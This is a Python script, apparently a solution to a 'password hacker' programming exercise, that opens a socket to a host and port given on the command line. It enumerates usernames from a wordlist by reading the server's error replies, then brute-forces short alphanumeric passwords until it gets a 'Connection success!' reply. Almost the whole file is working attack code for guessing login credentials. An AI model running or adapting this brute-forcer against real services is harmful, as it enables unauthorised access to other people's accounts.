import socket
import sys
import itertools
from typing import TextIO


def password_gen(pass_len):
    big_alphas = (chr(x) for x in range(ord('A'), ord('Z') + 1))
    alphas = (chr(x) for x in range(ord('a'), ord('z') + 1))
    digits = (chr(x) for x in range(ord('0'), ord('9') + 1))
    full_list = itertools.chain(alphas, big_alphas, digits)
    for var in itertools.product(full_list, repeat=pass_len):
        yield ("".join(var))


def dictionary_phrase(file: TextIO):
    for line in file:
        yield phrase_vars(line)


def phrase_vars(phrase):
    for var in itertools.product(
            *([letter.lower(), letter.upper()] if letter.isalpha() else [letter, letter] for letter in
              phrase.strip('\n'))):
        yield ("".join(var))


def test_pass():
    with open('/Users/andreytp/Downloads/logins.txt', 'r') as f:
        for phrases in dictionary_phrase(f):
            for message in phrases:
                print(message)


def hacking(host: str, port: str):
    with socket.socket() as client_socket:
        client_socket.connect((host, int(port)))
        attempt = 0
        right_login = '#'
        with open('/Users/andreytp/Downloads/logins.txt', 'r') as f:
            for message in f:
                pure_message = message.strip('\n')
                strjson = f'{{ "login": "{pure_message}", "password": "@"}}'
                client_socket.send(strjson.encode('utf8'))
                response = client_socket.recv(1024).decode('utf8')
                # print(attempt, strjson, response)
                if 'Wrong password!' in response:
                    right_login = pure_message
                attempt += 1
            # print(f'Attempt {attempt} password: {message}, result:{response}')
        if "#" == right_login:
            client_socket.close()
            print('Login not found')
            return

        for p_len in range(2, 5):
            for password in password_gen(p_len):
                strjson = f'{{ "login": "{right_login}", "password": "{password}"}}'
                client_socket.send(strjson.encode('utf8'))
                response = client_socket.recv(1024).decode('utf8')
                # print(strjson, response)
                if "Connection success!" in response:
                    client_socket.close()
                    print(strjson)
                    return


if __name__ == '__main__':
    args = sys.argv
    if len(args) != 3:
        print(args)
        print("The script should be called with two arguments")
        exit(1)
    hacking(*args[1:])
    # test_pass()
    # for item in password_gen(2):
    # print(list(password_gen(3)))
    # print(len(list(password_gen(3))))
    # print(set(password_gen(3)))
    # print(len(set(password_gen(3))))
